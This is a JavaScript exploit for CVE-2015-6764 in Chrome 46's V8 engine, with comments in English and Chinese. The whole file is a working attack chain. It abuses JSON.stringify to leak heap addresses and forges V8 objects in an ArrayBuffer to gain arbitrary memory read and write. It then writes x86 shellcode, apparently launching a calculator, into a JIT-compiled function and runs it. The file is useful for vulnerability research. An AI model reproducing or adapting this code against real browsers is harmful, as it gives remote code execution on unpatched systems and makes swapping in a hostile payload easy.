/*
  CVE-2015-6764 exp
  Chrome 46.0.2490.0 x86 on Linux x64
*/

// b v8::internal::BasicJsonStringifier::SerializeJSArray
// b json-stringifier.h:464
// x elements.location_
// x/20x xxxxxxxx

// Constants
var ARRAYBUF_LENGTH = 0x20000;
var FAKE_ARRAYBUFFER_BACKING_STORE_LENGTH = 0x20000000 / 2;

// Global objects
var is_debug = true;
var global = this;
var tmp = this;
var g_fake_arraybuffer = null;

// fake jsarray
// 0xDEADBEEF => fake_jsarray_map
// 0xDEADBEEF => properties == null obj pointer + 0x1c
// 0xDEADBEEF => elements
// 0xDEADBEEF => length

var fake_null_obj = [
  0xDEADBEEF, // Map (will be replaced)
  0xDEADBEEF, // kToStringOffset
  0x00000000, // kToNumberOffset
  0x00000000, // kTypeOffset
  0x00000006, // kKindOffset -> kNull = 3
];

var fake_oddball_map = [
  0xDEADBEEF, // Map
  0x2a000005,
  0x00000083,
  0x702003ff,
  0xDEADBEEF, // null obj pointer
  0xDEADBEEF, // null obj pointer
  0x00000000,
  0xDEADBEEF, // null obj pointer + 0x14
  0xDEADBEEF, // null obj pointer + 0x1c
  0xDEADBEEF, // null obj pointer + 0x1c
  0x00000000
];

var fake_jsarray_map = [
  0xDEADBEEF, // Map
  0x17000004,
  // 0x001100bd,
  // 0x710007ff,    // 0111 0001 0000 0000 0000 0111 1111 1111
  0x000100bd,       // 0000 0000 0000 0001 0000 0000 1011 1101
  0x702003ff,       // 0111 0000 0010 0000 0000 0011 1111 1111
  0xDEADBEEF, // prototype
  // 0x4750a04d,
  // 0x45b77c1d,
  // 0x45b77329, // instance_descriptors
  // 0x45b873a9,
  // 0x45b0809d,
  // 0x45b77c41
  0xDEADBEEF,
  0xDEADBEEF,
  0xDEADBEEF,
  0xDEADBEEF,
  0xDEADBEEF,
  0xDEADBEEF
]

// Utility functions
function debug_attach() {
  if (is_debug) {
    alert("attach me!")
  }
}

function breakpoint() {
  if (is_debug) {
    // bp chrome_child!v8::internal::Runtime_MathAtan2
    Math.atan2(1)
  }
}

function log(info) {
  console.log(info);
}

function debug_log(info) {
  if (is_debug) {
    console.log(info);
  }
}

function gc() {
  for (var i = 0; i < ((1024 * 1024) / 0x10); i++) {
    var a = new String();
  }
}

function new_space() {
  gc();
  gc();
}

// functions
function init_fake_jsarray_object() {
  // fake JSArray obj   0 - 6
  // fake JSArray Map   7 - 17
  // fake null          18 - 22
  // fake Oddball Map   23 - 33
  var fake_object_ptr = g_arraybuffer_backing_store_pointer;
  var fake_jsarraymap_ptr = fake_object_ptr + 7 * 4;
  var fake_null_obj_ptr = fake_jsarraymap_ptr + 11 * 4;
  var fake_oddball_map_ptr = fake_null_obj_ptr + 5 * 4;

  copy_array_to_buffer(g_arraybuff_obj, 7 * 4, fake_jsarray_map);
  copy_array_to_buffer(g_arraybuff_obj, 18 * 4, fake_null_obj);
  copy_array_to_buffer(g_arraybuff_obj, 23 * 4, fake_oddball_map);

  // fake JSArray Map
  g_dv.setInt32(0, fake_jsarraymap_ptr + 1, true);
  // fake Oddball Map
  g_dv.setInt32(18 * 4, fake_oddball_map_ptr + 1, true);
  // write fake null object pointer to fake JSArray Map's prototype field
  g_dv.setInt32(7 * 4 + 0x10, fake_null_obj_ptr + 1, true);
  // set length
  g_dv.setInt32(0xC, 40, true);
}

function copy_array_to_buffer(arraybuffer, offset, arr) {
  var dv = new DataView(arraybuffer, offset, arr.length * 4);
  for (var i = 0; i < arr.length; i++) {
    dv.setInt32(i * 4, arr[i], true);
  }
}

function create_malform_array_obj(len) {
  var eval_array = [];
  var eval_obj = {};
  eval_obj.toJSON = function () {
    eval_array.length = 1;
    gc();
  }
  for (var i = 0; i < len; i++) {
    eval_array[i] = 0x404040 + i;
  }
  eval_array[0] = eval_obj;
  eval_array[1] = null;           // 用于调试观察Null对象
  eval_array[2] = ['x', 'y'];     // 用于调试观察JSArray对象
  eval_array[3] = "I'm a string"; // 用于调试观察String对象
  return eval_array;
}

function leak_arraybuffer_backstore_address(json_str) {
  var arr = JSON.parse(json_str);
  for (var i = 0; i < arr.length - 10; i++) {
    if (arr[i] == ARRAYBUF_LENGTH) {
      return { arraybuffer: arr[i-1], wrapper: arr[i+11], v8text: arr[i+12] };
    }  
  }
  log("[*] leak arraybuffer address failed");
  return 0;
}

function write_dword_to_oob_memory(bytes) {
  tmp[2] = String.fromCharCode((bytes&0xff)+1, (bytes>>8)&0xff, (bytes>>16)&0xff, (bytes>>24)&0xff);
  // 给String分配个hash_field，不然这里默认是3，serialize的时候会认为是指针而报错崩溃
  var obj = {};
  obj[tmp[2]] = 0;
}

function leak_object_info(obj_ptr) {
  // write the object pointer to the fake JSArray object's elements field.
  g_dv.setInt32(8, (obj_ptr - 2 * 4) + 1, true);
  write_dword_to_oob_memory(g_arraybuffer_backing_store_pointer);
  var json_str = JSON.stringify(create_malform_array_obj(64));
  debug_log(json_str);
  var leaked_array = JSON.parse(json_str).filter(Array.isArray);
  if (leaked_array.length != 1) {
    log("[*] leak object 0x" + obj_ptr.toString(16) + " info failed");
  }
  debug_log(leaked_array);
  return leaked_array;
}

function leak_textobj_elements_pointer() {
  new_space();
  var leaked_array = leak_object_info(g_textobj_pointer);
  var p1 = leaked_array[0][1] * 2;
  debug_log("0x" + p1.toString(16));

  new_space();
  var leaked_array = leak_object_info(p1);
  var p2 = leaked_array[0][0] * 2;
  debug_log("0x" + p2.toString(16));

  new_space();
  var leaked_array = leak_object_info(p2);
  var text_obj_elements_ptr = leaked_array[0][2] * 2;
  debug_log("[*] blink::Text.elements: 0x" + text_obj_elements_ptr.toString(16));

  return text_obj_elements_ptr;
}

function set_fake_arraybuffer_backing_store_pointer(backing_store_ptr) {
  var fake_array_buffer = [
    jsarray_buffer_map_ptr + 1,
    jsarray_buffer_properties_ptr + 1,
    jsarray_buffer_elements_ptr + 1,
    backing_store_ptr,
    FAKE_ARRAYBUFFER_BACKING_STORE_LENGTH * 2,
    0x100
  ];

  for (var i = 0; i < fake_array_buffer.length; i++) {
    g_uint32array_obj[i] = fake_array_buffer[i];
  }
}

function hook_ArrayBuffer_toJSON() {
  if (this.byteLength == FAKE_ARRAYBUFFER_BACKING_STORE_LENGTH) {
    g_fake_arraybuffer = this;
  }
}

function create_dataview_with_fake_arraybuffer(ptr) {
  set_fake_arraybuffer_backing_store_pointer(ptr);
  if (g_fake_arraybuffer == null) {
    log("[*] fake arraybuffer is null.");
  }
  return new DataView(g_fake_arraybuffer);
}

function read_uint32(addr) {
  return create_dataview_with_fake_arraybuffer(addr).getUint32(0, true);
}

function write_uint32(addr, value) {
  create_dataview_with_fake_arraybuffer(addr).setUint32(0, value, true);
}

// exploit
// main
debug_attach();
/*
  Because V8 will run DOM binding codes when some DOM functions are called at first time. We don't want
  DOM binding codes that will create lots object in NewSpace to interfere with info leak later we force V8 
  to run DOM binding code before info leak by creating a Text object.
*/
var dummy = new Text("run DOM binding code before info leak");

/*
  Define a JSFunction object with a large function body.
*/
var func_body = "eval('');"
for (var i = 0; i < 2000; i++) {
  func_body += "a[" + i.toString() + "];";
}
var func_obj = new Function("a", func_body);
/*
  Force V8 to compile the JS function to native code, so a large chunk memory with PAGE_EXECUTE_READWRITE will be allocted.
  shellcode will be written into it later.
*/
func_obj({});

var g_uint32array_obj = new Uint32Array([0x41414141, 0x42424242, 0x43434343, 0x44444444, 0x45454545, 0x46464646]);
new_space();

// Step 1:
// 第一步是要创建一个受控制的backing store，将其中填入构造的fake JSArray，用于之后多次leak对象地址。之所以也要泄露该backing store地址是为了填充要构造的fake Map上的指针地址。
var g_arraybuff_obj = new ArrayBuffer(ARRAYBUF_LENGTH);
// 创建Text，设置多个exploit组件元素，使用上面的fake JSArray泄露其中各元素的指针地址。
var g_text_obj = new Text('PWN');

// 通过create_malform_array_obj中的gc，使得newspace置换压缩将g_arraybuff_obj和g_text_obj排列到eval_array后面，泄露出来
global[0] = g_arraybuff_obj;
global[1] = g_text_obj;

g_text_obj[0] = new ArrayBuffer(4); // will be used to leak JSArrayBuffer Map object pointer
g_text_obj[1] = g_uint32array_obj;  // 一个JSTypedArray用于填放fake JSArrayBuffer
g_text_obj[2] = func_obj; // 最后将shellcode写到其codeEntry，执行shellcode

var g_dv = new DataView(g_arraybuff_obj, 0, ARRAYBUF_LENGTH);

// 构造信息泄露，泄露出JSArrayBuffer的backing store地址和Text的地址
var json_str = JSON.stringify(create_malform_array_obj(64));
debug_log(json_str);
var leaked_addr = leak_arraybuffer_backstore_address(json_str);
debug_log(leaked_addr);
var g_arraybuffer_backing_store_pointer = leaked_addr['arraybuffer'] * 2; // 在heap上，非tagged
var g_wrapper_typeinfo = leaked_addr['wrapper'] * 2;  // TextWrapperTypeInfo
var g_textobj_pointer = leaked_addr['v8text'] * 2;  // Text
debug_log("[*] g_arraybuff_obj backstore pointer: 0x" + g_arraybuffer_backing_store_pointer.toString(16));
debug_log("[*] g_wrapper_typeinfo: 0x" + g_wrapper_typeinfo.toString(16));
debug_log("[*] g_textobj_pointer: 0x" + g_textobj_pointer.toString(16));

// 布置内存，创建fake JSArray
init_fake_jsarray_object();
// GET: 有了信息泄露，可以泄露出JSArrayBuffer的backing store指针，就可以构造fake JSArray，Map的值也可以通过信息泄露得到的指针地址来作填充。

// leak the elements field pointer of g_text_obj
var text_obj_elements_ptr = leak_textobj_elements_pointer();

// leak text_obj elements pointers: [0] JSArrayBuffer [1] JSUint32Array [2] JSFunction
new_space();
var leaked_array = leak_object_info(text_obj_elements_ptr);
var jsarray_buffer_ptr = leaked_array[0][2] * 2;
var jsuint32array_ptr = leaked_array[0][3] * 2;
var jsfunction_ptr = leaked_array[0][4] * 2;
debug_log("[*] JSArrayBuffer: 0x" + jsarray_buffer_ptr.toString(16));
debug_log("[*] JSUint32Array: 0x" + jsuint32array_ptr.toString(16));
debug_log("[*] JSFunction: 0x" + jsfunction_ptr.toString(16));

// leak JSArrayBuffer pointers
new_space();
var leaked_array = leak_object_info(jsarray_buffer_ptr);
var jsarray_buffer_map_ptr = leaked_array[0][0] * 2;
var jsarray_buffer_properties_ptr = leaked_array[0][1] * 2;
var jsarray_buffer_elements_ptr = leaked_array[0][2] * 2;
debug_log("[*] JSArrayBuffer Map: 0x" + jsarray_buffer_map_ptr.toString(16));
debug_log("[*] JSArrayBuffer properties: 0x" + jsarray_buffer_properties_ptr.toString(16));
debug_log("[*] JSArrayBuffer elements: 0x" + jsarray_buffer_elements_ptr.toString(16));

// leak JSUint32Array backing store pointer
new_space();
var leaked_array = leak_object_info(jsuint32array_ptr);
var jsuint32array_backing_store_ptr = leaked_array[0][2] * 2 + 0x10;
debug_log("[*] JSUint32Array backing store: 0x" + jsuint32array_backing_store_ptr.toString(16));

// 伪造一个JSArrayBuffer，此JSArrayBuffer通过改变backing store来实现任意地址读写。
set_fake_arraybuffer_backing_store_pointer(0xDEADBEEF);

new_space();
ArrayBuffer.prototype.toJSON = hook_ArrayBuffer_toJSON;

write_dword_to_oob_memory(jsuint32array_backing_store_ptr);

// trigger bug, created fake JSArrayBuffer will be serialized, hooked toJSON method will be invoked. Get g_fake_arraybuffer.
JSON.stringify(create_malform_array_obj(100));

var jsfunction_jit_address = read_uint32(jsfunction_ptr + 0xC);
debug_log("[*] JSFunction JIT code address: 0x" + jsfunction_jit_address.toString(16));

var shellcode = [0x90909090, 0x90909090, 0x6c68c931, 0x68000063, 0x6163782f, 0x69622f68, 0x752f686e, 0xe3897273, 0xe1895351, 0x3a68d231, 0x68000030, 0x3d59414c, 0x53494468, 0x31e28950, 0x895250c0, 0xcd0bb0e2, 0x00000080];

for (var i = 0; i < shellcode.length; i++) {
  write_uint32(jsfunction_jit_address + i * 4, shellcode[i]);
}

breakpoint();
func_obj();
